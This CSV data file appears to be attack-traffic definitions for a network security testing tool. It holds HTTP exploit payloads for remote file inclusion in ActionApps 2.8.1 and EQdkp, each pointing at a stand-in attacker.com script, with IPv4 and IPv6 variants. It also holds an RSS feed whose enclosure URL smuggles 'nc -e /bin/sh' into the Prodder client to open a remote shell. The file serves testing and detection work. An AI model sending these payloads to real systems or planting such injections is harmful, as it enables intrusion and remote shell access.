XmlName,ExecDesc,EngDesc,Protocol,SPECProtocol,Payload
﻿ActionApps_cmi.xml,ActionApps 2.8.1  Remote File Inclusion,This threat send a crafted HTTP query containing a local or remote path to a file which is included into the PHP source via cached.php3's GLOBALS[AA_INC_PATH] parameter. ActionApps is a web based application which typically listens on port 80.,HTTP,TCP,"GET /%2Fapc%2Fcached.php3%3FGLOBALS%5BAA_INC_PATH%5D%3Dhttp%3A%2F%2Fwww.attacker.com%2Fevil.php HTTP/1.1[[0D 0A ]]Accept: text/html, text/plain, application/x-ogg, application/ogg, text/vnd.rn-realtext, image/vnd.rn-realpix, application/smil, audio/mp3, audio/x-mp3, audio/mpeg, audio/mpg, audio/x-mpeg, audio/x-mpg, audio/mpegurl, audio/x-mpegurl, audio/wav[[0D 0A ]]Accept-Encoding: gzip, compress[[0D 0A ]]Accept-Language: en[[0D 0A ]]User-Agent: Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7i[[0D 0A ]]HOST: www.example.com[[0D 0A 0D 0A]]"
ActionApps_cmi.xml,ActionApps 2.8.1  Remote File Inclusion,This threat send a crafted HTTP query containing a local or remote path to a file which is included into the PHP source via cached.php3's GLOBALS[AA_INC_PATH] parameter. ActionApps is a web based application which typically listens on port 80.,HTTP,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿ActionApps_cmi_IPv6.xml,ActionApps 2.8.1  Remote File Inclusion (IPv6 Version),This threat send a crafted HTTP query containing a local or remote path to a file which is included into the PHP source via cached.php3's GLOBALS[AA_INC_PATH] parameter. ActionApps is a web based application which typically listens on port 80. (IPv6 Version),HTTP/IPv6,TCP,"GET /%2Fapc%2Fcached.php3%3FGLOBALS%5BAA_INC_PATH%5D%3Dhttp%3A%2F%2Fwww.attacker.com%2Fevil.php HTTP/1.1[[0D 0A ]]Accept: text/html, text/plain, application/x-ogg, application/ogg, text/vnd.rn-realtext, image/vnd.rn-realpix, application/smil, audio/mp3, audio/x-mp3, audio/mpeg, audio/mpg, audio/x-mpeg, audio/x-mpg, audio/mpegurl, audio/x-mpegurl, audio/wav[[0D 0A ]]Accept-Encoding: gzip, compress[[0D 0A ]]Accept-Language: en[[0D 0A ]]User-Agent: Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7i[[0D 0A ]]HOST: www.example.com[[0D 0A 0D 0A]]"
ActionApps_cmi_IPv6.xml,ActionApps 2.8.1  Remote File Inclusion (IPv6 Version),This threat send a crafted HTTP query containing a local or remote path to a file which is included into the PHP source via cached.php3's GLOBALS[AA_INC_PATH] parameter. ActionApps is a web based application which typically listens on port 80. (IPv6 Version),HTTP/IPv6,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿EQdkp_cmi.xml,EQdkp Arbitrary Remote File Execution,"This threat sends a crafted HTTP GET query which includes an arbitrary remote file containing PHP code which is executed by the server via the ""eqdkp_root_path"" parameter. EQdkp is a web based application with typically listens on port 80.",HTTP,TCP,"GET //includes/dbal.php?eqdkp_root_path=http://www.attacker.com/cmd.gif?cmd=ls HTTP/1.1[[0D 0A ]]Accept: text/html, text/plain, application/x-ogg, application/ogg, text/vnd.rn-realtext, image/vnd.rn-realpix, application/smil, audio/mp3, audio/x-mp3, audio/mpeg, audio/mpg, audio/x-mpeg, audio/x-mpg, audio/mpegurl, audio/x-mpegurl, audio/wav[[0D 0A ]]Accept-Encoding: gzip, compress[[0D 0A ]]Accept-Language: en[[0D 0A ]]User-Agent: Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7i[[0D 0A ]]HOST: www.example.com[[0D 0A 0D 0A]]"
EQdkp_cmi.xml,EQdkp Arbitrary Remote File Execution,"This threat sends a crafted HTTP GET query which includes an arbitrary remote file containing PHP code which is executed by the server via the ""eqdkp_root_path"" parameter. EQdkp is a web based application with typically listens on port 80.",HTTP,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿EQdkp_cmi_IPv6.xml,EQdkp Arbitrary Remote File Execution (IPv6 Version),"This threat sends a crafted HTTP GET query which includes an arbitrary remote file containing PHP code which is executed by the server via the ""eqdkp_root_path"" parameter. EQdkp is a web based application with typically listens on port 80. (IPv6 Version)",HTTP/IPv6,TCP,"GET //includes/dbal.php?eqdkp_root_path=http://www.attacker.com/cmd.gif?cmd=ls HTTP/1.1[[0D 0A ]]Accept: text/html, text/plain, application/x-ogg, application/ogg, text/vnd.rn-realtext, image/vnd.rn-realpix, application/smil, audio/mp3, audio/x-mp3, audio/mpeg, audio/mpg, audio/x-mpeg, audio/x-mpg, audio/mpegurl, audio/x-mpegurl, audio/wav[[0D 0A ]]Accept-Encoding: gzip, compress[[0D 0A ]]Accept-Language: en[[0D 0A ]]User-Agent: Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7i[[0D 0A ]]HOST: www.example.com[[0D 0A 0D 0A]]"
EQdkp_cmi_IPv6.xml,EQdkp Arbitrary Remote File Execution (IPv6 Version),"This threat sends a crafted HTTP GET query which includes an arbitrary remote file containing PHP code which is executed by the server via the ""eqdkp_root_path"" parameter. EQdkp is a web based application with typically listens on port 80. (IPv6 Version)",HTTP/IPv6,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿Prodder_cmi.xml,Prodder Arbitrary Shell Command Execution Vulnerability,This threat exploits a failure in Prodder to properly sanitize user-supplied input allowing arbitrary command-execution vulnerability.,HTTP,TCP,GET /evil.xml HTTP/1.0[[0D 0A ]]User-Agent: Googlebot/2.1[[0D 0A ]]Host: www.example.com[[0D 0A ]]Connection: close[[0D 0A 0D 0A]]
Prodder_cmi.xml,Prodder Arbitrary Shell Command Execution Vulnerability,This threat exploits a failure in Prodder to properly sanitize user-supplied input allowing arbitrary command-execution vulnerability.,HTTP,TCP,"<?xml version=""1.0"" encoding=""UTF-8""?>[[0D 0A ]]<?xml-stylesheet type=""text/xsl""?>[[0D 0A ]]<rss version=""2.0"">[[0D 0A ]]<channel>[[0D 0A ]]    <title>RedTeam Pentesting Example Malicious Server Feed</title>[[0D 0A 0D 0A ]]    <item>[[0D 0A ]]        <enclosure url=""http://www.example.com/example.mp3'; nc -e /bin/sh -l -p 1337 &amp; ';#'""[[0D 0A ]]         length=""241734"" type=""audio/mpeg"" />[[0D 0A ]]    </item>[[0D 0A ]]</channel>[[0D 0A ]]</rss>"
